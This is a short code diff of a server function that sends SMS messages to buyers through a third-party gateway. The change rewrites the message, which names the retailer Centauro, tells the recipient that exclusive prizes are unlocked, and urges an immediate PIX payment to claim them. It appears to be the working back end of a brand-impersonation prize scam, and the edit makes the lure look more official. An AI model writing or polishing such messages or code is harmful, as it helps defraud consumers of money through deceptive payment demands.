@@ -106,7 +106,7 @@ serve(async (req) => {
           const phoneClean = buyerPhone.replace(/\D/g, '');
           const phoneFormatted = phoneClean.startsWith('55') ? phoneClean : `55${phoneClean}`;
           const firstName = buyerName ? buyerName.split(' ')[0] : 'Cliente';
-          const smsMessage = `${firstName}, voce ganhou premios exclusivos Centauro! Finalize o PIX agora e resgate na hora. Centauro Copa 2026`;
+          const smsMessage = `Centauro: ${firstName}, seus premios exclusivos estao liberados! Pague o PIX e resgate na hora.`;
           
           const smsResponse = await fetch(`https://sms.aresfun.com/v1/integration/${smsToken}/send-sms`, {
             method: 'POST',
